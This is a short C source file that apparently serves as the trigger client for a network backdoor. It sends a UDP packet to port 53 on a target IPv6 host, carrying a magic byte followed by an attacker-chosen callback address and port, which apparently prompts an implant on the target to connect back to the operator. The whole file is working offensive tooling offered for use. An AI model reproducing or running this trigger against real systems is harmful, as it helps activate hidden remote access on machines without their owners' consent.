/*
MIT License

Copyright (c) 2022 raj3shp

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#define TRIGGER_PORT "53"
#define MAGIC_BYTE '!'
#define DELIMITER '|'

int main(int argc, char *argv[]) {
    if (argc < 3 || argc > 4) {
        fprintf(stderr, "Usage: %s <target_ipv6> <callback_ipv6> [callback_port]\n", argv[0]);
        fprintf(stderr, "  Global/ULA: %s 2001:db8::50 2001:db8::212 65000\n", argv[0]);
        fprintf(stderr, "  Link-local: %s fe80::50%%eth0 fe80::212%%eth0 65000\n", argv[0]);
        fprintf(stderr, "  Loopback:   %s ::1 ::1 65000\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    const char *callback_ip = argv[2];
    const char *callback_port = (argc == 4) ? argv[3] : "65000";

    // Build payload: X<callback_ipv6>|<callback_port>|
    char payload[128];
    int payload_len = snprintf(payload, sizeof(payload), "%c%s%c%s%c",
                               MAGIC_BYTE, callback_ip, DELIMITER, callback_port, DELIMITER);
    if (payload_len < 0 || payload_len >= (int)sizeof(payload)) {
        fprintf(stderr, "[-] Payload string is too long.\n");
        return 1;
    }

    struct addrinfo hints, *res, *p;
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET6;     // IPv6 only
    hints.ai_socktype = SOCK_DGRAM; // UDP

    int err = getaddrinfo(target_ip, TRIGGER_PORT, &hints, &res);
    if (err != 0) {
        fprintf(stderr, "[-] getaddrinfo failed for '%s': %s\n", target_ip, gai_strerror(err));
        return 1;
    }

    int sd = -1;
    for (p = res; p != NULL; p = p->ai_next) {
        sd = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (sd < 0) continue;

        ssize_t sent = sendto(sd, payload, payload_len, 0, p->ai_addr, p->ai_addrlen);
        if (sent == payload_len) {
            printf("[+] Sent %zd-byte IPv6 trigger ('%s') to [%s]:%s\n", sent, payload, target_ip, TRIGGER_PORT);
            close(sd);
            freeaddrinfo(res);
            return 0;
        }

        perror("[-] sendto failed");
        close(sd);
    }

    fprintf(stderr, "[-] Could not send IPv6 trigger packet to %s\n", target_ip);
    freeaddrinfo(res);
    return 1;
}
